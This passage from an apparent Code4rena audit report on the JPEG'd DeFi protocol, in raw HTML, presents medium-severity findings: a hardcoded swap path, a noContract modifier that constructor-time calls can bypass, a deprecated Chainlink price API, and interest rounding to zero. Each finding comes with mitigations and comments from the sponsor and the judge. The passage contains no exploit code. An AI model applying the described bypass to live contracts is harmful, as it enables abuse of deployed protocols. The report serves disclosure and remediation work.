class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">_weth</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wethBalance</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;NOOP&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L410-L430\">StrategyPUSDConvex.sol#L410-L430</a><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_swapUniswapV2</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IUniswapV2Router</span><span class=\"mtk1\"> </span><span class=\"mtk12\">router</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIn</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenOut</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenIn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">router</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">path</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">path</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">path</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">router</span><span class=\"mtk1\">.</span><span class=\"mtk11\">swapExactTokensForTokens</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">path</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>In the current implementation, <code>rewardTokens</code> from the underlying strategy will be swapped to <code>weth</code> first then <code>weth</code> -> <code>usdc</code>.</p>\n<p>However, the <code>path</code> used for swapping from <code>rewardToken</code> -> <code>weth</code> is hardcoded as <code>[rewardToken, weth]</code>, which may not be the optimal route.</p>\n<p>For example, the majority liquidity for a particular <code>rewardToken</code> may actually be in the <code>rewardToken/USDC</code> pool. Swapping through the <code>rewardToken/WETH</code> with low liquidity may end up getting only a dust amount of WETH.</p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider allowing the admin to set a path for the rewardTokens.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/157#issuecomment-1098388022\">spaghettieth (JPEG’d) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>As of now, the one in the contract is the optimal routing path.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/157#issuecomment-1109923759\">LSDan (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I think the warden has made a reasonable find and recommendation. The sponsor used the phrase ‘as of now’ in disputing the report, but the idea that it may not always be the optimal path is actually specifically what the report and its mitigation addresses. That said, external factors are required so moving it to medium severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-the-nocontract-modifier-does-not-work-as-expected\" style=\"position:relative;\"><a href=\"#m-09-the-nocontract-modifier-does-not-work-as-expected\" aria-label=\"m 09 the nocontract modifier does not work as expected permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/11\">[M-09] The noContract modifier does not work as expected.</a></h2>\n<p><em>Submitted by Wayne, also found by hyh, PPrieditis, rayn, smiling</em>heretic, and Cr4ckM3_</p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/vaults/yVault/yVault.sol#L61\">yVault.sol#L61</a><br>\n<a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/farming/yVaultLPFarming.sol#L54\">yVaultLPFarming.sol#L54</a><br></p>\n<p>The expectation of the noContract modifier is to allow access only to accounts inside EOA or Whitelist, if access is controlled using ! access control with _account.isContract(), then because isContract() gets the size of the code length of the account in question by relying on extcodesize/address.code.length, this means that the restriction can be bypassed when deploying a smart contract through the smart contract’s constructor call.</p>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Modify the code to <code>require(msg.sender == tx.origin);</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1095292333\">spaghettieth (JPEG’d) confirmed, but disagreed with Medium severity and commented</a>:</strong></p>\n<blockquote>\n<p>The observations made in the issue are correct, but given how impractical it would be to make an autocompounder that bypasses the <code>noContract</code> modifier this issue should probably be severity 0. It’s worth mentioning that this behaviour was already known as outlined in the modifier’s documentation.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1099249484\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/17\">jpegd/core#17</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1109971129\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I’m going to let this stand. Impractical or not, this is very easily exploited.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-chainlink-pricer-is-using-a-deprecated-api\" style=\"position:relative;\"><a href=\"#m-10-chainlink-pricer-is-using-a-deprecated-api\" aria-label=\"m 10 chainlink pricer is using a deprecated api permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/4\">[M-10] Chainlink pricer is using a deprecated API</a></h2>\n<p><em>Submitted by cccz, also found by 0xDjango, 0xkatana, berndartmueller, Cr4ckM3, defsec, horsefacts, hyh, JMukesh, joshie, Jujic, pedroais, peritoflores, rayn, reassor, Ruhum, and WatchPug</em></p>\n<p>According to Chainlink’s documentation, the latestAnswer function is deprecated. This function might suddenly stop working if Chainlink stops supporting deprecated APIs. And the old API can return stale data.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L105\">FungibleAssetVaultForDAO.sol#L105</a><br>\n<a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L459\">NFTVault.sol#L459</a><br></p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use the latestRoundData function to get the price instead. Add checks on the return data with proper revert messages if the price is stale or the round is uncomplete.<br>\n<a href=\"https://docs.chain.link/docs/price-feeds-api-reference/\">https://docs.chain.link/docs/price-feeds-api-reference/</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/4\">spaghettieth (JPEG’d) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/4#issuecomment-1099244659\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/9\">jpegd/core#9</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-division-before-multiplication-may-result-in-no-interest-being-accrued\" style=\"position:relative;\"><a href=\"#m-11-division-before-multiplication-may-result-in-no-interest-being-accrued\" aria-label=\"m 11 division before multiplication may result in no interest being accrued permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/97\">[M-11] Division before Multiplication May Result In No Interest Being Accrued</a></h2>\n<p><em>Submitted by AuditsAreUS, also found by minhquanym</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L590-L595\">NFTVault.sol#L590-L595</a><br></p>\n<p>There is a division before multiplication bug in <code>NFTVault._calculateAdditionalInterest()</code> which may result in no interesting being accrued and will have significant rounding issues for tokens with small decimal places.</p>\n<p>This issue occurs since an intermediate calculation of  <code>interestPerSec</code> may round to zero and therefore the multiplication by <code>elapsedTime</code> may remain zero.</p>\n<p>Furthermore, even if <code>interestPerSec > 0</code> there will still be rounding errors as a result of doing division before multiplication and <code>_calculatedInterest()</code> will be understated.</p>\n<p>This issue is significant as one divisor is 365 days = 30,758,400 (excluding the rate). Since many ERC20 tokens such as USDC and USDT only have 6 decimal places a numerator of less 30 * 10^6 will round to zero.</p>\n<p>The rate also multiplies into the denominator. e.g. If the rate is 1% then the denominator will be equivalent to <code>1 / rate * 30 * 10^6 = 3,000 * 10^6</code>.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The order of operations for the interest calculations</p>\n<ul>\n<li><code>totalDebtAmount</code></li>\n<li>MUL <code>settings.debtInterestApr.numerator</code></li>\n<li>DIV <code>settings.debtInterestApr.denominator</code></li>\n<li>DIV <code>365 days</code></li>\n<li>MUL <code>elapsedTime</code></li>\n</ul>\n<p>If the intermediate value of <code>interestPerSec = 0</code> then the multiplication by <code>elapsedTime</code> will still be zero and no interested will be accrued.</p>\n<p>Excerpt from <code>NFTVault._calculateAdditionalInterest()</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 interestPerYear = (totalDebtAmount *</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            settings.debtInterestApr.numerator) /</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            settings.debtInterestApr.denominator;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 interestPerSec = interestPerYear / 365 days;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return elapsedTime * interestPerSec;</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>This issue may be resolved by performing the multiplication by <code>elapsedTime</code> before the division by the denominator or <code>365 days</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 interestAccrued = (elapsedTime * </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            totalDebtAmount *</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            settings.debtInterestApr.numerator) /</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            settings.debtInterestApr.denominator /</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            365 days;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return  interestAccrued;</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/97\">spaghettieth (JPEG’d) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/97\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed <a href=\"https://github.com/jpegd/core/pull/8\">jpegd/core#8</a>. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/97#issuecomment-1110008295\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This report makes sense as a medium to me because it involves a calculation error that can lead to the protocol functioning incorrectly.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 42 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/225\">report highlighted below</a> by <strong>Dravee</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/204\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/215\">0xDjango</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/69\">robee</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/84\">PPrieditis</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/71\">Kthere</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/62\">hickuphh3</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/196\">0xkatana</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/171\">WatchPug</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/232\">horsefacts</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/212\">ilan</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/179\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/112\">berndartmueller</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/178\">hubble</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/222\">hyh</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/189\">kebabsec</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/224\">kenta</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/192\">Hawkeye</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/46\">TerrierLover</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/217\">rfa</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/120\">catchup</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/140\">rayn</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/144\">Foundation</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/148\">Funen</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/150\">Picodes</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/21\">TrungOre</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/177\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/183\">ellahi</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/126\">JMukesh</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/90\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/154\">Cityscape</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/55\">Jujic</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/202\">JC</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/188\">dy</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/98\">AuditsAreUS</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/184\">pauliax</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/53\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/79\">cmichel</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/94\">reassor</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/39\">minhquanym</a>, <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/22\">samruna</a>, and <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/6\">jayjonah8</a>.</em></p>\n<h2 id=\"codebase-impressions--summary\" style=\"position:relative;\"><a href=\"#codebase-impressions--summary\" aria-label=\"codebase impressions  summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 